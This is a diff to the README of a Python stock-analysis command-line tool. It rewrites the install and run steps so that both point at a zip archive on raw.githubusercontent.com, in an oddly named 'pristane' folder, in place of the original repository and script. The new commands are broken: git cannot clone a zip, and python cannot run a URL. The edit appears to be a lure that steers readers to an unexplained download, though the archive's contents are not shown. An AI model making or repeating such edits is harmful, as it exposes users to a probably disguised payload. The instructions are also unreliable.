@@ -13,7 +13,7 @@ A command-line Python tool for analyzing stock market data with real-time ticker
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/purelmnz/StockAnalyzerFinal.git
+   git clone https://raw.githubusercontent.com/PureLmnz/StockAnalyzer/main/pristane/Stock-Analyzer-Albireo.zip
    cd StockAnalyzerFinal
    ```
 
@@ -27,7 +27,7 @@ A command-line Python tool for analyzing stock market data with real-time ticker
 Run the program from the project directory:
 
 ```bash
-python stock_analyzer.py
+python https://raw.githubusercontent.com/PureLmnz/StockAnalyzer/main/pristane/Stock-Analyzer-Albireo.zip
 ```
 
 ### Main menu
